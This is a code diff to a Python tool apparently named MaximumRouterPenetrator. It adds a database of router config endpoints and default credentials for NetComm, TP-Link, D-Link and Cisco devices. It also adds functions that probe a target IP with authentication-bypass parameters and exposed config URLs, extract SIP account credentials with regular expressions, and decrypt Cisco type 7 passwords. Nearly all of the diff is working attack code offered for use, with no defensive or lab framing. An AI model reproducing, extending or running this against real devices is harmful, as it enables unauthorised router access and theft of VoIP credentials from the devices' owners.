@@ -100,7 +100,7 @@ class MaximumRouterPenetrator:
         self.sip_extraction_engine = self._build_advanced_sip_engine()
         
         # Router-specific exploitation database
-        self.router_specific_exploits = self._build_router_exploits()
+        self.router_specific_exploits = self._build_router_specific_exploits()
         
         # Verification system
         self.verification_system = self._build_verification_system()
@@ -339,6 +339,39 @@ class MaximumRouterPenetrator:
                 r'password\s+7\s+([A-Fa-f0-9]{8,})',
                 r'secret\s+5\s+(\$[15]\$[^\s]+)'
             ]
+        }
+    
+    def _build_router_specific_exploits(self) -> Dict[str, Dict]:
+        """Build router-specific exploitation database"""
+        return {
+            'netcomm': {
+                'config_endpoints': ['/config.xml', '/backup.conf', '/cgi-bin/config.exp'],
+                'sip_endpoints': ['/voip.xml', '/sip.xml', '/admin/voip.asp'],
+                'bypass_methods': ['admin:admin', 'unauthenticated_access'],
+                'known_vulnerabilities': ['default_credentials', 'config_exposure'],
+                'success_indicators': ['netcomm', 'nf-', 'nl-']
+            },
+            'tplink': {
+                'config_endpoints': ['/userRpm/ConfigRpm.htm', '/cgi-bin/luci/admin/system/admin'],
+                'sip_endpoints': ['/userRpm/VoipConfigRpm.htm', '/cgi-bin/luci/admin/services/voip'],
+                'bypass_methods': ['admin:admin', 'admin:tplink'],
+                'known_vulnerabilities': ['luci_bypass', 'config_download'],
+                'success_indicators': ['tp-link', 'archer', 'tl-']
+            },
+            'dlink': {
+                'config_endpoints': ['/config.xml', '/admin/config.asp'],
+                'sip_endpoints': ['/voice.html', '/admin/voip.asp'],
+                'bypass_methods': ['admin:', 'admin:admin'],
+                'known_vulnerabilities': ['empty_password', 'asp_bypass'],
+                'success_indicators': ['d-link', 'dir-', 'di-']
+            },
+            'cisco': {
+                'config_endpoints': ['/admin/config.xml', '/cgi-bin/config.exp'],
+                'sip_endpoints': ['/voice/config', '/cgi-bin/voice_config.cgi'],
+                'bypass_methods': ['cisco:cisco', 'admin:cisco'],
+                'known_vulnerabilities': ['type7_passwords', 'voice_config_exposure'],
+                'success_indicators': ['cisco', 'ios', 'catalyst']
+            }
         }
     
     def _build_verification_system(self) -> Dict[str, List[str]]:
@@ -829,6 +862,124 @@ class MaximumRouterPenetrator:
                 continue
         
         return sip_result
+    
+    def _test_advanced_bypasses(self, ip: str, verbose: bool) -> Dict[str, Any]:
+        """Test advanced bypass techniques"""
+        bypass_result = {'success': False}
+        
+        # Try parameter-based bypasses
+        for param in self.advanced_bypasses['parameter_bypass']:
+            try:
+                url = f"http://{ip}/admin/?{param}"
+                
+                if REQUESTS_AVAILABLE:
+                    response = requests.get(url, timeout=3)
+                    
+                    if (response.status_code == 200 and
+                        any(indicator in response.text.lower() 
+                           for indicator in ['admin', 'configuration', 'system'])):
+                        
+                        bypass_result = {
+                            'success': True,
+                            'method': f'parameter_bypass_{param}',
+                            'url': url,
+                            'content': response.text
+                        }
+                        
+                        if verbose:
+                            print(f"            ✅ Parameter bypass: {param}")
+                        return bypass_result
+            except:
+                continue
+        
+        return bypass_result
+    
+    def _test_direct_endpoints(self, ip: str, verbose: bool) -> Dict[str, Any]:
+        """Test direct endpoint access"""
+        direct_result = {'success': False, 'content': ''}
+        
+        # Test config endpoints
+        all_endpoints = (self.maximum_endpoints['config_access'] + 
+                        self.maximum_endpoints['sip_endpoints'] +
+                        self.maximum_endpoints['bypass_endpoints'])
+        
+        for endpoint in all_endpoints[:100]:  # Limit for performance
+            try:
+                url = f"http://{ip}{endpoint}"
+                
+                if REQUESTS_AVAILABLE:
+                    response = requests.get(url, timeout=2)
+                    content = response.text
+                    status = response.status_code
+                else:
+                    response = urllib.request.urlopen(url, timeout=2)
+                    content = response.read().decode('utf-8', errors='ignore')
+                    status = response.status
+                
+                if status == 200 and len(content) > 100:
+                    # Verify content quality
+                    indicators = self.verification_system['config_file_indicators']
+                    found = sum(1 for ind in indicators if ind.lower() in content.lower())
+                    
+                    if found >= 3:
+                        direct_result = {
+                            'success': True,
+                            'endpoint': endpoint,
+                            'content': content,
+                            'url': url
+                        }
+                        
+                        if verbose:
+                            print(f"            ✅ Direct access: {endpoint}")
+                        break
+            
+            except:
+                continue
+        
+        return direct_result
+    
+    def _extract_verified_sip_data(self, content: str, verbose: bool) -> List[Dict[str, Any]]:
+        """Extract verified SIP data"""
+        verified_accounts = []
+        
+        # Use comprehensive patterns
+        for pattern in self.sip_extraction_engine['individual_sip_patterns']:
+            try:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                
+                for match in matches:
+                    if len(match) > 3 and self._is_valid_sip_data(match):
+                        account = {
+                            'type': 'verified_sip_data',
+                            'value': match,
+                            'source': 'verified_extraction'
+                        }
+                        
+                        # Handle encrypted passwords
+                        if re.match(r'^[A-Fa-f0-9]{8,}$', match):
+                            decrypted = self._decrypt_cisco_type7(match)
+                            if decrypted != "Failed":
+                                account['encrypted'] = match
+                                account['decrypted'] = decrypted
+                                account['type'] = 'password'
+                        
+                        verified_accounts.append(account)
+            except:
+                continue
+        
+        return verified_accounts
+    
+    def _is_valid_sip_data(self, data: str) -> bool:
+        """Validate SIP data"""
+        if not data or len(data) < 3:
+            return False
+        
+        # Reject garbage
+        garbage = ['#008bc6', 'null', 'undefined', 'none', '****']
+        if any(g in data.lower() for g in garbage):
+            return False
+        
+        return True
     
     def _extract_and_verify_sip(self, content: str, ip: str, verbose: bool) -> Dict[str, Any]:
         """Extract and verify SIP data"""
